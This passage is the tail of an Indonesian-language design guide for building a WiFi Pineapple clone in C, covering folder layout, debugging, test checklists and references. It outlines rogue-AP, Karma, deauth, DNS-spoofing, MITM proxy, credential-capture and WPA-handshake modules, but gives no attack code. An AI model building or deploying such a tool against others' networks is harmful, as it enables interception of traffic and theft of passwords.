| **Sniffer** | `sniffer.c` | Sniff probe, auth, assoc | `<sys/socket.h>`, `<linux/if_packet.h>` |
| **Broadcaster** | `rogue_ap.c` | Kirim beacon, probe, auth, assoc | `<arpa/inet.h>`, `<string.h>` |
| **Attacker** | `karma.c`, `deauth.c` | Karma & Deauth attacks | `<unistd.h>`, `<string.h>` |
| **Server** | `dhcp.c`, `dns.c` | DHCP, DNS spoofing | `<stdlib.h>`, `<string.h>` |
| **MITM** | `proxy.c` | HTTP proxy & credential capture | `<sys/socket.h>`, `<netinet/in.h>` |
| **Web UI** | `web_ui.c` | Web dashboard | `<sys/socket.h>`, `<netinet/in.h>` |
| **Capture** | `handshake.c` | WPA handshake capture | `<stdio.h>`, `<string.h>` |
| **Modules** | `module.c` | Module system | `<dlfcn.h>` |
| **Filter** | `filter.c` | Traffic filtering | `<string.h>` |
| **Utils** | `utils.c` | Utility functions | `<sys/socket.h>`, `<linux/if_packet.h>` |
| **Logger** | `logger.c` | Logging system | `<stdio.h>`, `<time.h>` |

---

## 14. Struktur Kode

### Struktur Folder Akhir — Semua file dan folder proyek

```
project/
├── main.c                     # 100-150 lines — Entry point, orchestrator
├── config.h                   # 50-60 lines — Global configuration
├── Makefile                   # 30-50 lines — Build automation
│
├── core/
│   ├── rogue_ap.c             # 300-400 lines — Rogue AP core
│   ├── rogue_ap.h             # 30-40 lines — AP declarations
│   ├── sniffer.c              # 200-300 lines — Sniffer
│   └── sniffer.h              # 20-25 lines — Sniffer declarations
│
├── attack/
│   ├── karma.c                # 100-150 lines — Karma attack
│   ├── karma.h                # 10-15 lines — Karma declarations
│   ├── deauth.c               # 150-200 lines — Deauth attack
│   └── deauth.h               # 10-15 lines — Deauth declarations
│
├── server/
│   ├── dhcp.c                 # 200-300 lines — DHCP server
│   ├── dhcp.h                 # 20-25 lines — DHCP declarations
│   ├── dns.c                  # 150-200 lines — DNS spoofing
│   └── dns.h                  # 10-15 lines — DNS declarations
│
├── mitm/
│   ├── proxy.c                # 300-400 lines — HTTP proxy
│   ├── proxy.h                # 20-25 lines — Proxy declarations
│   ├── capture.c              # 150-200 lines — Credential capture
│   └── capture.h              # 10-15 lines — Capture declarations
│
├── capture/
│   ├── handshake.c            # 150-200 lines — WPA handshake capture
│   └── handshake.h            # 10-15 lines — Handshake declarations
│
├── web/
│   ├── web_ui.c               # 200-300 lines — Web dashboard
│   └── web_ui.h               # 15-20 lines — Web declarations
│
├── modules/
│   ├── module.c               # 100-150 lines — Module system
│   └── module.h               # 10-15 lines — Module declarations
│
├── filter/
│   ├── filter.c               # 100-150 lines — Traffic filtering
│   └── filter.h               # 10-15 lines — Filter declarations
│
└── utils/
    ├── utils.c                # 200-300 lines — Utility functions
    ├── utils.h                # 30-40 lines — Utility declarations
    ├── logger.c               # 100-150 lines — Logging system
    └── logger.h               # 10-15 lines — Logger declarations

TOTAL: ~2800+ lines
```

### Dependencies (Grafik) — Hubungan antar file

```
main.c
├── config.h
├── core/rogue_ap.h → core/rogue_ap.c → utils/utils.h
├── core/sniffer.h  → core/sniffer.c  → core/rogue_ap.h, utils/utils.h
├── attack/karma.h  → attack/karma.c  → core/rogue_ap.h, utils/utils.h
├── attack/deauth.h → attack/deauth.c → core/rogue_ap.h, utils/utils.h
├── server/dhcp.h   → server/dhcp.c   → utils/utils.h
├── server/dns.h    → server/dns.c    → utils/utils.h
├── mitm/proxy.h    → mitm/proxy.c    → mitm/capture.h, utils/utils.h
├── mitm/capture.h  → mitm/capture.c  → utils/utils.h
├── capture/handshake.h → capture/handshake.c → utils/utils.h
├── web/web_ui.h    → web/web_ui.c    → utils/utils.h
├── modules/module.h → modules/module.c → utils/utils.h
├── filter/filter.h → filter/filter.c → utils/utils.h
└── utils/logger.h  → utils/logger.c  → utils/utils.h
```

---

## 15. Testing & Debugging

### Tools yang Dibutuhkan — Software untuk testing dan debugging

| Tool | Fungsi | Install | Header yang Diuji |
|------|--------|---------|-------------------|
| **gcc** | Compiler | `sudo apt install gcc` | Semua header |
| **make** | Build automation | `sudo apt install make` | Makefile |
| **gdb** | Debugger | `sudo apt install gdb` | Semua header |
| **wireshark** | Packet analysis | `sudo apt install wireshark` | `<linux/if_packet.h>` |
| **tcpdump** | CLI packet capture | `sudo apt install tcpdump` | `<linux/if_packet.h>` |
| **aircrack-ng** | WiFi testing | `sudo apt install aircrack-ng` | — |
| **valgrind** | Memory leak check | `sudo apt install valgrind` | Semua header |
| **curl** | HTTP testing | `sudo apt install curl` | `<sys/socket.h>` |

### Debugging Strategy — Langkah-langkah debugging

#### Step 1: Compile dengan Debug Symbol
```bash
gcc -g -o rogue_ap *.c -pthread
```

#### Step 2: Gunakan GDB
```bash
gdb ./rogue_ap
(gdb) break send_beacon           // Breakpoint di beacon
(gdb) run
(gdb) next                        // Step ke baris berikutnya
(gdb) print *cfg                  // Print config
(gdb) continue
```

#### Step 3: Print Debug
```c
// Tambahkan di kode
#define DEBUG 1

#if DEBUG
    printf("[DEBUG] Sending beacon on channel %d\n", cfg->channel);
    printf("[DEBUG] Frame control: 0x%04x\n", hdr->frame_control);
#endif
```

#### Step 4: Wireshark Capture
```bash
# Terminal 1: Jalankan program
sudo ./rogue_ap

# Terminal 2: Capture dengan wireshark
sudo wireshark -i wlan0 -k
# Filter di wireshark: wlan.fc.type == 0
# Lihat frame yang dikirim
```

### Testing Checklist — Fitur yang harus diuji

| Fitur | Test | Expected | Header Terkait |
|-------|------|----------|----------------|
| **Beacon** | Scan WiFi dari HP | SSID "FreeWiFi" muncul | `<arpa/inet.h>`, `<string.h>` |
| **Probe Response** | HP scan WiFi | Response terkirim | `<arpa/inet.h>`, `<string.h>` |
| **Auth** | HP connect | Auth success | `<arpa/inet.h>`, `<string.h>` |
| **Assoc** | HP connect | Assoc success | `<arpa/inet.h>`, `<string.h>` |
| **Karma** | HP cari AP | Auto-connect | `<string.h>`, `<unistd.h>` |
| **Deauth** | HP connected | Disconnect | `<arpa/inet.h>`, `<string.h>` |
| **Beacon Flooding** | Scan WiFi | 100+ SSID muncul | `<string.h>`, `<unistd.h>` |
| **DHCP** | HP connect | Dapat IP | `<stdlib.h>`, `<string.h>` |
| **DNS** | Buka website | Redirect | `<string.h>`, `<stdlib.h>` |
| **MITM** | HTTP login | Password capture | `<sys/socket.h>`, `<string.h>` |
| **Web UI** | Buka browser | Dashboard muncul | `<sys/socket.h>`, `<netinet/in.h>` |
| **Handshake** | Client connect | .cap file tersimpan | `<stdio.h>`, `<string.h>` |
| **Modules** | Load/unload | Plugin berjalan | `<dlfcn.h>` |
| **Filtering** | Filter IP/MAC | Traffic terfilter | `<string.h>` |

---

## 16. Referensi

### 16.1. Buku — Referensi buku yang direkomendasikan

- "802.11 Wireless Networks" - Matthew Gast
- "WiFi Security" - Johnny Cache
- "The Linux Programming Interface" - Michael Kerrisk
- "The C Programming Language" - Kernighan & Ritchie
- "Hacking Wireless Networks" - Andreas Kolokithas

### 16.2. Website — Sumber online

- IEEE 802.11: https://standards.ieee.org/
- Wi-Fi Alliance: https://www.wi-fi.org/
- Linux Wireless: https://wireless.wiki.kernel.org
- Hak5 Pineapple: https://shop.hak5.org/products/wifi-pineapple
- Wireshark 802.11: https://wiki.wireshark.org/802.11
- Aircrack-ng: https://www.aircrack-ng.org/

### 16.3. Tools — Software yang digunakan

- Wireshark - Packet analysis
- Aircrack-ng - WiFi security testing & handshake crack
- hostapd - Software AP
- Linux nl80211 - Kernel interface
- tcpdump - CLI packet capture
- Valgrind - Memory leak checking
- GDB - Debugger

---

## 17. Lampiran

### A. Istilah Penting — Definisi istilah-istilah kunci

| Istilah | Arti | Header Terkait |
|---------|------|----------------|
| BSSID | MAC address AP | `<string.h>` |
| SSID | Nama jaringan WiFi | `<string.h>` |
| Beacon | Frame broadcast AP | `<arpa/inet.h>` |
| Probe | Frame request/response | `<arpa/inet.h>` |
| MIMO | Multiple Input Multiple Output | — |
| MU-MIMO | Multi-User MIMO | — |
| OFDMA | Orthogonal Frequency Division Multiple Access | — |
| TWT | Target Wake Time | — |
| MITM | Man-in-the-Middle | `<sys/socket.h>` |
| Karma | Menjawab semua probe request | `<string.h>` |
| Deauth | Frame untuk memutus koneksi client | `<arpa/inet.h>` |
| EAPOL | Extensible Authentication Protocol over LAN | `<stdio.h>` |

### B. Channel WiFi (2.4 GHz) — Channel yang tidak overlap

| Channel | Frekuensi (GHz) | Overlap |
|---------|-----------------|---------|
| 1 | 2.412 | Tidak |
| 6 | 2.437 | Tidak |
| 11 | 2.462 | Tidak |

### C. Checklist Fitur Lengkap — Semua fitur Hak5 Pineapple yang dicapai

| Fitur | Status | Fase | Header Utama |
|-------|--------|------|--------------|
| Rogue AP Basic | ⬜ | Fase 1 | `<arpa/inet.h>`, `<string.h>` |
| Probe Response | ⬜ | Fase 1 | `<arpa/inet.h>`, `<string.h>` |
| Auth/Assoc | ⬜ | Fase 1 | `<arpa/inet.h>`, `<string.h>` |
| Karma Attack | ⬜ | Fase 2 | `<string.h>`, `<unistd.h>` |
| Deauth Attack | ⬜ | Fase 2 | `<arpa/inet.h>`, `<string.h>` |
| Beacon Flooding | ⬜ | Fase 2 | `<string.h>`, `<unistd.h>` |
| Multiple SSID | ⬜ | Fase 2 | `<string.h>`, `<unistd.h>` |
| DHCP Server | ⬜ | Fase 3 | `<stdlib.h>`, `<string.h>` |
| DNS Spoofing | ⬜ | Fase 3 | `<string.h>`, `<stdlib.h>` |
| Logging | ⬜ | Fase 3 | `<stdio.h>`, `<time.h>` |
| Client Tracking | ⬜ | Fase 3 | `<stdio.h>`, `<time.h>` |
| MITM Proxy | ⬜ | Fase 4 | `<sys/socket.h>`, `<netinet/in.h>` |
| Credential Capture | ⬜ | Fase 4 | `<stdio.h>`, `<string.h>` |
| Web Dashboard | ⬜ | Fase 5 | `<sys/socket.h>`, `<netinet/in.h>` |
| WPA Handshake Capture | ⬜ | Fase 6 | `<stdio.h>`, `<string.h>` |
| Module System | ⬜ | Fase 7 | `<dlfcn.h>` |
| Traffic Filtering | ⬜ | Fase 7 | `<string.h>` |

### D. Urutan Pembuatan File — Rekomendasi urutan membuat file

```
1. config.h         (konfigurasi global) — <stdint.h>, <stdbool.h>
2. utils/utils.h    (utility declarations) — <stdint.h>, "config.h"
3. utils/utils.c    (utility implementations) — "utils.h", <stdio.h>, <string.h>, <sys/socket.h>, <linux/if_packet.h>
4. core/rogue_ap.h  (AP declarations) — "config.h"
5. core/rogue_ap.c  (AP implementations) — "rogue_ap.h", "utils.h", <string.h>, <arpa/inet.h>
6. core/sniffer.h   (Sniffer declarations) — "config.h"
7. core/sniffer.c   (Sniffer implementations) — "sniffer.h", "rogue_ap.h", <sys/socket.h>
8. attack/karma.h   (Karma declarations) — "config.h"
9. attack/karma.c   (Karma implementations) — "karma.h", "rogue_ap.h", <string.h>
10. attack/deauth.h  (Deauth declarations) — "config.h"
11. attack/deauth.c  (Deauth implementations) — "deauth.h", "rogue_ap.h", <string.h>
12. server/dhcp.h    (DHCP declarations) — "config.h"
13. server/dhcp.c    (DHCP implementations) — "dhcp.h", <stdlib.h>
14. server/dns.h     (DNS declarations) — "config.h"
15. server/dns.c     (DNS implementations) — "dns.h", <stdlib.h>
16. mitm/proxy.h     (Proxy declarations) — "config.h"
17. mitm/proxy.c     (Proxy implementations) — "proxy.h", <sys/socket.h>
18. mitm/capture.h   (Capture declarations) — <stdint.h>
19. mitm/capture.c   (Capture implementations) — "capture.h", "logger.h", <string.h>
20. capture/handshake.h (Handshake declarations) — <stdint.h>
21. capture/handshake.c (Handshake implementations) — "handshake.h", <stdio.h>
22. web/web_ui.h     (Web declarations) — "config.h"
23. web/web_ui.c     (Web implementations) — "web_ui.h", <sys/socket.h>
24. modules/module.h (Module declarations) — <stdint.h>
25. modules/module.c (Module implementations) — "module.h", <dlfcn.h>
26. filter/filter.h  (Filter declarations) — "config.h"
27. filter/filter.c  (Filter implementations) — "filter.h", <string.h>
28. utils/logger.h   (Logger declarations) — <time.h>
29. utils/logger.c   (Logger implementations) — "logger.h", <stdio.h>, <time.h>
30. main.c           (Entry point) — <pthread.h>, <signal.h>, semua header
31. Makefile         (Build automation) — —
```

### E. Format Markdown untuk Unduh

```markdown
# Cara Mengunduh

1. Copy seluruh teks di atas
2. Paste ke text editor
3. Save sebagai `wifi_pineapple.md`
4. Baca dengan Markdown viewer
```

---

**Akhir Dokumen**

> *"Building your own WiFi Pineapple is the best way to understand WiFi security."*